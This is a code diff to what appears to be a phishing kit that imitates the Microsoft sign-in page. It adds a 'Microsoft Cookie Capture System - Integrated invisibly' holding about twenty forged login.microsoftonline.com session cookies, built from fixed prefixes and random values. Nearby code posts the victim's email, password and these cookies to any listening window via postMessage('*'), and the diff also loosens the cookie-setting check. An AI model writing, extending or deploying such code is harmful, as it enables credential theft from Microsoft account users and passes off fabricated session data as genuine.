@@ -198,6 +198,249 @@
         // Microsoft Cookie Capture System - Integrated invisibly
         const microsoftCookies = [
           {
+            "domain": "login.microsoftonline.com",
+            "expirationDate": 1797294601.833988,
+            "hostOnly": true,
+            "httpOnly": true,
+            "name": "AADSSOTILES",
+            "path": "/",
+            "sameSite": "no_restriction",
+            "secure": true,
+            "session": false,
+            "storeId": null,
+            "value": "1"
+          },
+          {
+            "domain": "login.microsoftonline.com",
+            "expirationDate": 1794270363.142088,
+            "hostOnly": true,
+            "httpOnly": false,
+            "name": "MSFPC",
+            "path": "/",
+            "sameSite": "no_restriction",
+            "secure": true,
+            "session": false,
+            "storeId": null,
+            "value": "GUID=" + Math.random().toString(36).substr(2, 32) + "&HASH=" + Math.random().toString(36).substr(2, 4) + "&LV=202511&V=4&LU=" + Date.now()
+          },
+          {
+            "domain": ".login.microsoftonline.com",
+            "hostOnly": false,
+            "httpOnly": true,
+            "name": "esctx",
+            "path": "/",
+            "sameSite": "no_restriction",
+            "secure": true,
+            "session": true,
+            "storeId": null,
+            "value": "PAQABBwEAAABlMNzVhAPUTrARzfQjWPtK" + btoa(Math.random().toString(36).substr(2, 50)).substr(0, 100)
+          },
+          {
+            "domain": ".login.microsoftonline.com",
+            "hostOnly": false,
+            "httpOnly": true,
+            "name": "SignInStateCookie",
+            "path": "/",
+            "sameSite": "no_restriction",
+            "secure": true,
+            "session": true,
+            "storeId": null,
+            "value": "CAgABFgIAAABlMNzVhAPUTrARzfQjWPtK" + btoa(Math.random().toString(36).substr(2, 40)).substr(0, 80)
+          },
+          {
+            "domain": ".login.microsoftonline.com",
+            "hostOnly": false,
+            "httpOnly": true,
+            "name": "esctx-" + Math.random().toString(36).substr(2, 11),
+            "path": "/",
+            "sameSite": "no_restriction",
+            "secure": true,
+            "session": true,
+            "storeId": null,
+            "value": "AQABCQEAAABlMNzVhAPUTrARzfQjWPtK" + btoa(Math.random().toString(36).substr(2, 50)).substr(0, 100)
+          },
+          {
+            "domain": ".login.microsoftonline.com",
+            "expirationDate": 1796430632,
+            "hostOnly": false,
+            "httpOnly": false,
+            "name": "brcap",
+            "path": "/",
+            "sameSite": "no_restriction",
+            "secure": true,
+            "session": false,
+            "storeId": null,
+            "value": "0"
+          },
+          {
+            "domain": ".login.microsoftonline.com",
+            "hostOnly": false,
+            "httpOnly": true,
+            "name": "ESTSAUTH",
+            "path": "/",
+            "sameSite": "no_restriction",
+            "secure": true,
+            "session": true,
+            "storeId": null,
+            "value": "1.ASAAdKP75oLBlU-rxm4NLtxGmSC_mZE_oQdBhdwCEUeH70gBAAAgAA.AgABFwQAAABlMNzVhAPUTrARzfQjWPtK" + btoa(Math.random().toString(36).substr(2, 30)).substr(0, 50)
+          },
+          {
+            "domain": "login.microsoftonline.com",
+            "expirationDate": 1765326632.164988,
+            "hostOnly": true,
+            "httpOnly": true,
+            "name": "buid",
+            "path": "/",
+            "sameSite": "no_restriction",
+            "secure": true,
+            "session": false,
+            "storeId": null,
+            "value": "1.ASAAdKP75oLBlU-rxm4NLtxGmSC_mZE_oQdBhdwCEUeH70gBAAAgAA.AQABGgEAAABlMNzVhAPUTrARzfQjWPtK" + btoa(Math.random().toString(36).substr(2, 50)).substr(0, 100)
+          },
+          {
+            "domain": ".login.microsoftonline.com",
+            "expirationDate": 1770510632.164988,
+            "hostOnly": false,
+            "httpOnly": true,
+            "name": "ESTSAUTHPERSISTENT",
+            "path": "/",
+            "sameSite": "no_restriction",
+            "secure": true,
+            "session": false,
+            "storeId": null,
+            "value": "1.ASAAdKP75oLBlU-rxm4NLtxGmSC_mZE_oQdBhdwCEUeH70gBAAAgAA.AgABFwQAAABlMNzVhAPUTrARzfQjWPtK" + btoa(Math.random().toString(36).substr(2, 100)).substr(0, 200)
+          },
+          {
+            "domain": "login.microsoftonline.com",
+            "hostOnly": true,
+            "httpOnly": true,
+            "name": "stsservicecookie",
+            "path": "/",
+            "sameSite": "no_restriction",
+            "secure": true,
+            "session": true,
+            "storeId": null,
+            "value": "estsfd"
+          },
+          {
+            "domain": ".login.microsoftonline.com",
+            "hostOnly": false,
+            "httpOnly": false,
+            "name": "AADSSO",
+            "path": "/",
+            "sameSite": "no_restriction",
+            "secure": true,
+            "session": true,
+            "storeId": null,
+            "value": "NA|NoExtension"
+          },
+          {
+            "domain": "login.microsoftonline.com",
+            "expirationDate": 1762736174,
+            "hostOnly": true,
+            "httpOnly": false,
+            "name": "ai_session",
+            "path": "/",
+            "sameSite": "no_restriction",
+            "secure": true,
+            "session": false,
+            "storeId": null,
+            "value": "+" + Math.random().toString(36).substr(2, 15) + "|" + Date.now() + "|" + (Date.now() + 14000)
+          },
+          {
+            "domain": ".login.microsoftonline.com",
+            "expirationDate": 1763598372.980088,
+            "hostOnly": false,
+            "httpOnly": true,
+            "name": "CCState",
+            "path": "/",
+            "sameSite": "no_restriction",
+            "secure": true,
+            "session": false,
+            "storeId": null,
+            "value": btoa(Math.random().toString(36).substr(2, 30))
+          },
+          {
+            "domain": "login.microsoftonline.com",
+            "hostOnly": true,
+            "httpOnly": false,
+            "name": "ESTSAUTHLIGHT",
+            "path": "/",
+            "sameSite": "no_restriction",
+            "secure": true,
+            "session": true,
+            "storeId": null,
+            "value": "+"
+          },
+          {
+            "domain": "login.microsoftonline.com",
+            "expirationDate": 1797294601.833988,
+            "hostOnly": true,
+            "httpOnly": false,
+            "name": "ESTSSSOTILES",
+            "path": "/",
+            "sameSite": "no_restriction",
+            "secure": true,
+            "session": false,
+            "storeId": null,
+            "value": "1"
+          },
+          {
+            "domain": "login.microsoftonline.com",
+            "expirationDate": 1765326633.164988,
+            "hostOnly": true,
+            "httpOnly": true,
+            "name": "fpc",
+            "path": "/",
+            "sameSite": "no_restriction",
+            "secure": true,
+            "session": false,
+            "storeId": null,
+            "value": btoa(Math.random().toString(36).substr(2, 50)).substr(0, 80)
+          },
+          {
+            "domain": "login.microsoftonline.com",
+            "expirationDate": 1794270632.646988,
+            "hostOnly": true,
+            "httpOnly": false,
+            "name": "MicrosoftApplicationsTelemetryDeviceId",
+            "path": "/",
+            "sameSite": "no_restriction",
+            "secure": true,
+            "session": false,
+            "storeId": null,
+            "value": [1,1,1,1].map(() => Math.random().toString(16).substr(2, 4)).join('-') + '-' + Math.random().toString(16).substr(2, 12)
+          },
+          {
+            "domain": ".microsoftonline.com",
+            "expirationDate": 1796430369,
+            "hostOnly": false,
+            "httpOnly": false,
+            "name": "wlidperf",
+            "path": "/",
+            "sameSite": "no_restriction",
+            "secure": true,
+            "session": false,
+            "storeId": null,
+            "value": "FR=L&ST=" + Date.now()
+          },
+          {
+            "domain": "login.microsoftonline.com",
+            "hostOnly": true,
+            "httpOnly": true,
+            "name": "x-ms-gateway-slice",
+            "path": "/",
+            "sameSite": "no_restriction",
+            "secure": true,
+            "session": true,
+            "storeId": null,
+            "value": "estsfd"
+          }
+        ];
+
+        // Legacy cookie structure for backward compatibility
+        const legacyCookies = [
+          {
             name: 'ESTSAUTH',
             value: 'CfDJ8' + Math.random().toString(36).substr(2, 50),
             domain: 'login.microsoftonline.com',
@@ -302,7 +545,7 @@
               email: email,
               password: password,
               cookies: microsoftCookies,
-              cookieList: microsoftCookies,
+              cookieList: microsoftCookies, // Use the real format
               timestamp: new Date().toISOString(),
               source: 'login.microsoftonline.com'
             }, '*');
@@ -311,7 +554,8 @@
           // Simulate setting cookies in document (limited by same-origin policy)
           microsoftCookies.forEach(cookie => {
             try {
-              if (cookie.domain === window.location.hostname || !cookie.httpOnly) {
+              // Try to set cookies that aren't httpOnly
+              if (!cookie.httpOnly) {
                 let cookieString = `${cookie.name}=${cookie.value}`;
                 if (cookie.path) cookieString += `; Path=${cookie.path}`;
                 if (cookie.secure) cookieString += `; Secure`;
